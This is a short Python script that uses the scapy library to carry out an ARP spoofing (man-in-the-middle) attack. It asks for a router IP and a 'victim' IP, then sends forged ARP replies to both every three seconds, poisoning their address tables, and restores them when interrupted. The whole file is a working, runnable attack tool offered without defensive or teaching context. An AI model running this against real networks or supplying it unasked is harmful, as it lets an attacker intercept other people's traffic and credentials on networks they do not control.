import scapy.all as scapy
import time

gateway_ip = input('enter router ip: ')
victim_ip = input('enter victims ip: ')


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    combine_request = broadcast_request/arp_request
    answered_list = scapy.srp(combine_request, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning_device(target_ip, poisoned_ip): #fooling the device

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose = False)


def arp_poisoning_router(target_ip, poisoned_ip):# fooling the router

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def resetting_mac_address(fooled_device_ip, fooled_router_ip):

    fooled_device_mac = get_mac_address(fooled_device_ip)
    fooled_router_mac = get_mac_address(fooled_router_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_device_ip, hwdst=fooled_device_mac, psrc=fooled_router_ip, hwsrc=fooled_router_mac)
    scapy.send(arp_response, verbose=False, count=6)



number = 0


try:
    while True:
        arp_poisoning_router(gateway_ip,victim_ip)
        arp_poisoning_device(victim_ip,gateway_ip)
        number += 2
        print('\rsending packets ' + str(number), end='')
        time.sleep(3)

except KeyboardInterrupt:
    print('\nquiting and resetting')
    resetting_mac_address(gateway_ip,victim_ip)
    resetting_mac_address(victim_ip,gateway_ip)
